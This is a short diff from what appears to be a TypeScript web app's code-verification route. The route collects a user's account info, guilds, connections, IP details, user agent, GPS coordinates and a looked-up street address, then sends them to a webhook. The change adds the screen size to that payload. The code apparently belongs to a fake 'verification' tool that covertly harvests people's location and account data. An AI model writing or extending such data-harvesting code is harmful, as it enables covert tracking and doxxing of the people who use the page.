@@ -66,7 +66,7 @@ const verifyCode = async (code: string, req: NextRequest, gps: GpsData, screenSi
 
         const address = await getAddress(gps.hh, gps.xf);
         
-        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua, gps, address);
+        const webhookResult = await sendWebhook(userInfo, ownGuilds, connections, ipInfo, ua, gps, address, screenSize);
         
         if (!webhookResult.success) {
             console.log("Failed to send webhook");
